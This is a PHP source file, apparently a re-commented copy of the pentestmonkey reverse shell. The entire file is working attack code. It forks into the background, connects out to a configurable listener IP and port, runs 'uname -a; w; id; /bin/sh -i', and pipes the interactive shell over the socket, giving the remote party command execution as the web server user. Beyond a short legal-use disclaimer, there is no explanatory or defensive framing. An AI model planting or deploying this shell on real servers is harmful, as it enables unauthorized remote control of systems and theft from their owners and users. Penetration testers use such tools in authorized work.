<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

// This tool may be used for legal purposes only. Users take full responsibility
// for any actions performed using this tool. The author accepts no liability
// for damage caused by this tool. If these terms are not acceptable to you, then
// do not use this tool.

// Description
// -----------
// This script makes an outbound TCP connection to a specified IP and port.
// The recipient gets a shell running as the current user (e.g., Apache user).

// -------- Configuration -------- //
// Disable the script's time limit
set_time_limit(0);

// Script version
$VERSION = "1.0";

// IP address and port of the listening server (Update these)
$ip = '127.0.0.1';  // CHANGE THIS to your listener's IP
$port = 1234;       // CHANGE THIS to your listener's port

// Chunk size for data transfer
$chunk_size = 1400;

// Shell command to execute on connection
$shell = 'uname -a; w; id; /bin/sh -i';

// Flags for debugging and daemonization
$daemon = 0;
$debug = 0;

// -------- Daemonization -------- //
// Attempt to daemonize the PHP process to avoid zombies
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork(); // Fork the process

    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }

    if ($pid) {
        exit(0); // Parent process exits
    }

    // Make the child process a session leader
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }

    $daemon = 1; // Mark as daemonized
} else {
    printit("WARNING: Failed to daemonize. This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Reset file permissions to a default state
umask(0);

// -------- Reverse Shell -------- //
// Open a socket connection to the specified IP and port
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Set up the descriptors for the shell process
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin
    1 => array("pipe", "w"),  // stdout
    2 => array("pipe", "w")   // stderr
);

// Spawn the shell process
$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set all streams to non-blocking mode
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

// Infinite loop to handle communication
while (1) {
    // Check if the TCP connection is closed
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    // Check if the shell process has terminated
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    // Prepare for I/O
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // Handle data received from the socket
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }

    // Handle data received from stdout of the shell
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }

    // Handle data received from stderr of the shell
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}

// Close all streams and terminate the shell process
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// -------- Helper Functions -------- //
// Function to print debug messages or errors
function printit($string) {
    global $daemon;
    if (!$daemon) {
        print "$string\n";
    }
}

?>
